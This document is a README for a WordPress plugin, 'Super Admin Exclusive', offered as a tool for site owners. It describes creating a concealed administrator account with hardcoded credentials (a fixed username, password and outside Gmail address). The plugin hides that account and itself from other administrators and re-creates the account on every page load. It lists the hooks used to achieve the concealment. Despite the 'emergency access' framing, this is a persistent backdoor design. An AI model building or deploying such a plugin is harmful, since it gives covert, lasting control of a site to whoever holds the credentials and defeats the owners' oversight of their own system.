# Super Admin Exclusive Plugin

**Plugin Name:** Super Admin Exclusive  
**Author:** yellwohoster  
**Version:** 1.2

## Description

This plugin creates a hidden `super` administrator role and user in WordPress. This user and role are concealed from all other users, including other administrators, to provide an exclusive access level while retaining full administrative functionality.

**Warning:** This plugin creates a user with hardcoded credentials. It is critical to change these credentials immediately after activation.

## Features

*   **Creates Super Role:** On activation, it creates a `super` user role with the same capabilities as a standard Administrator.
*   **Creates Super User:** It creates a default `super` user. The initial credentials are:
    *   **Username:** `super`
    *   **Email:** `uog780@gmail.com`
    *   **Password:** `Ads@2512`
*   **Stealthy Operation:**
    *   The `super` role is hidden from role selection dropdowns for all users except the `super` user.
    *   The `super` user is hidden from the main user list (`users.php`) for all other users.
    *   The plugin itself is hidden from the plugins list for all users except the `super` user.
*   **Exclusive Dashboard:**
    *   Adds a "Super User Dashboard" accessible only to the `super` user under `Settings -> Super` and `Tools -> Super`.
    *   This dashboard lists all users with the `super` role and includes a form for the `super` user to reset their own password.

## Installation

1.  Upload the `Super` plugin folder to the `/wp-content/plugins/` directory.
2.  Activate the plugin through the 'Plugins' menu in WordPress.
3.  Log in immediately with the default `super` user credentials.
4.  Navigate to **Settings -> Super** and use the form to change your password.

## How It Works

The plugin uses several WordPress hooks and filters to achieve its functionality:

*   `register_activation_hook`: Creates the `super` role and user when the plugin is activated.
*   `plugins_loaded`: Ensures the role and user exist on every page load.
*   `editable_roles` & `wp_dropdown_roles`: Removes the `super` role from being displayed or assigned by other admins.
*   `pre_user_query`: Modifies the user query to exclude the `super` user from lists.
*   `all_plugins`: Hides this plugin from the plugin list for non-super users.
*   `admin_menu`: Adds the hidden dashboard menu pages, visible only to the `super` user.

This plugin is intended for site owners who require a separate, hidden administrative account for management or emergency access purposes.